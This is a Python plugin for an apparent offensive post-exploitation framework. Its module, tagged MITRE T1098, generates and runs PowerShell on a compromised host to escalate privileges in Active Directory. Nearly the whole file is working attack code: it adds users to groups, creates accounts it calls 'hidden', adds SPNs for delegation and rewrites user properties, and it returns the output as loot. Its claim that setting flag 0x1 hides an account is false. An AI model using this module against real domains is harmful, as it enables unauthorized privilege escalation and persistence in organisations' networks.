"""lateral_movement/ldap_modify — Modify Active Directory objects for privilege escalation. MITRE T1098"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class LDAPModify(BasePlugin):
    NAME = "ldap_modify"
    DESCRIPTION = "Modify LDAP/AD objects: add users to groups, create accounts, set SPNs, modify ACLs"
    AUTHOR = "fitnah-team"
    MITRE = "T1098"
    CATEGORY = "lateral_movement"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=True,
              help="modify_user | add_group | create_account | set_spn | modify_acl"),
        Param("target", str, required=False, default="",
              help="Target object (user/computer name)"),
        Param("group", str, required=False, default="",
              help="Group to add to (for add_group action)"),
        Param("property", str, required=False, default="",
              help="Property to modify (for modify_user)"),
        Param("value", str, required=False, default="",
              help="New value for property"),
        Param("account_name", str, required=False, default="",
              help="New account name (for create_account)"),
        Param("password", str, required=False, default="",
              help="Password for new account"),
        Param("spn", str, required=False, default="",
              help="SPN to add (for set_spn)"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute LDAP modification"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "").lower()
        target = params.get("target", "")

        if action == "modify_user":
            return self._modify_user(ctx, target, params)
        elif action == "add_group":
            return self._add_to_group(ctx, target, params.get("group", ""))
        elif action == "create_account":
            return self._create_account(ctx, params)
        elif action == "set_spn":
            return self._set_spn(ctx, target, params.get("spn", ""))
        elif action == "modify_acl":
            return self._modify_acl(ctx, target, params)
        else:
            return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _modify_user(ctx, target: str, params) -> ModuleResult:
        """Modify user account properties"""
        prop = params.get("property", "")
        value = params.get("value", "")

        if not target or not prop or not value:
            return ModuleResult.err("Requires target, property, and value")

        ps_code = f"""
$results = @()
$results += '[*] Modifying LDAP user object...'

try {{
    $targetUser = '{target}'
    $property = '{prop}'
    $newValue = '{value}'

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Target: $targetUser, Property: $property"
    $results += "[*] Domain: $domain"

    # Find user in LDAP
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(&(objectClass=user)(sAMAccountName=$targetUser))"

    $user = $ds.FindOne()
    if (-not $user) {{
        $results += "[-] User not found"
        $results -join "`n"
        exit
    }}

    $results += "[+] User found: $($user.Path)"

    # Modify property
    try {{
        $userEntry = $user.GetDirectoryEntry()
        $userEntry.Properties[$property].Value = $newValue
        $userEntry.CommitChanges()
        $results += "[+] $property set to: $newValue"
    }} catch {{
        $results += "[-] Error modifying $property : $_"
    }}

}} catch {{
    $results += "[!] Modification error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Modification failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="ldap_modify_user")

    @staticmethod
    def _add_to_group(ctx, target: str, group: str) -> ModuleResult:
        """Add user to Active Directory group"""
        if not target or not group:
            return ModuleResult.err("Requires target user and group")

        ps_code = f"""
$results = @()
$results += '[*] Adding user to LDAP group...'

try {{
    $targetUser = '{target}'
    $targetGroup = '{group}'

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] User: $targetUser → Group: $targetGroup"

    # Get group
    $groupEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://cn=$targetGroup,ou=Groups,$([ADSI]'LDAP://rootDSE').defaultNamingContext")

    # Add user to group
    try {{
        $groupEntry.Properties['member'].Add("CN=$targetUser,$([ADSI]'LDAP://rootDSE').defaultNamingContext")
        $groupEntry.CommitChanges()
        $results += "[+] User added to group successfully"
    }} catch {{
        $results += "[-] Error adding to group: $_"
    }}

}} catch {{
    $results += "[!] Add group error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Add to group failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="ldap_group_add")

    @staticmethod
    def _create_account(ctx, params) -> ModuleResult:
        """Create new hidden AD account"""
        account_name = params.get("account_name", "")
        password = params.get("password", "")

        if not account_name:
            return ModuleResult.err("Requires account_name")

        ps_code = f"""
$results = @()
$results += '[*] Creating hidden AD account...'

try {{
    $accountName = '{account_name}'
    $accountPassword = '{password}'

    if (-not $accountPassword) {{
        $accountPassword = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 16 | %{{[char]$_}})
        $results += "[*] Generated password: (hidden)"
    }}

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dn = ([ADSI]'LDAP://rootDSE').defaultNamingContext.Value

    $results += "[*] Creating account: $accountName in $domain"

    # Create user account in LDAP
    $ou = [ADSI]"LDAP://ou=Users,$dn"
    $user = $ou.Create('user', "cn=$accountName")
    $user.Put('sAMAccountName', $accountName)
    $user.Put('userPrincipalName', "$accountName@$domain")
    $user.SetInfo()

    # Set password
    $user.SetPassword($accountPassword)
    $user.Put('userAccountControl', 512)  # Normal account
    $user.SetInfo()

    $results += "[+] Account created: $accountName"
    $results += "[*] Password: $accountPassword"

    # Make account hidden (set UF_SCRIPT)
    $uac = [int]$user.userAccountControl
    $user.Put('userAccountControl', $uac -bor 0x1)
    $user.SetInfo()
    $results += "[+] Account hidden"

}} catch {{
    $results += "[!] Create account error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Create account failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="ldap_create_account")

    @staticmethod
    def _set_spn(ctx, target: str, spn: str) -> ModuleResult:
        """Set SPN on user or computer for delegation"""
        if not target or not spn:
            return ModuleResult.err("Requires target and spn")

        ps_code = f"""
$results = @()
$results += '[*] Setting SPN for delegation...'

try {{
    $targetAccount = '{target}'
    $servicePrincipalName = '{spn}'

    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController().Name

    $results += "[*] Target: $targetAccount, SPN: $servicePrincipalName"

    # Find account (user or computer)
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc")
    $ds = New-Object System.DirectoryServices.DirectorySearcher($de)
    $ds.Filter = "(|(sAMAccountName=$targetAccount)(sAMAccountName=$($targetAccount)$))"

    $account = $ds.FindOne()
    if (-not $account) {{
        $results += "[-] Account not found"
        $results -join "`n"
        exit
    }}

    $results += "[+] Account found: $($account.Path)"

    # Add SPN
    try {{
        $accountEntry = $account.GetDirectoryEntry()
        $accountEntry.Properties['servicePrincipalName'].Add($servicePrincipalName)
        $accountEntry.CommitChanges()
        $results += "[+] SPN added: $servicePrincipalName"
    }} catch {{
        $results += "[-] Error adding SPN: $_"
    }}

}} catch {{
    $results += "[!] Set SPN error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        if r["status"] != "ok":
            return ModuleResult.err(f"Set SPN failed: {r['output']}")

        return ModuleResult.ok(data=r["output"], loot_kind="ldap_set_spn")

    @staticmethod
    def _modify_acl(ctx, target: str, params) -> ModuleResult:
        """Modify LDAP object ACLs"""
        ps_code = f"""
$results = @()
$results += '[*] Modifying LDAP ACLs...'

try {{
    $targetObject = '{target}'
    $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

    $results += "[*] Target: $targetObject, Domain: $domain"
    $results += '[*] ACL modification requires:'
    $results += '    1. Admin privileges'
    $results += '    2. ADSI ACL API knowledge'
    $results += '    3. SID of account to grant permissions'

    $results += '[!] This is advanced and error-prone'
    $results += '[!] Recommend using native AD management tools'

}} catch {{
    $results += "[!] ACL error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r.get("output", "ACL modification requires manual configuration"))
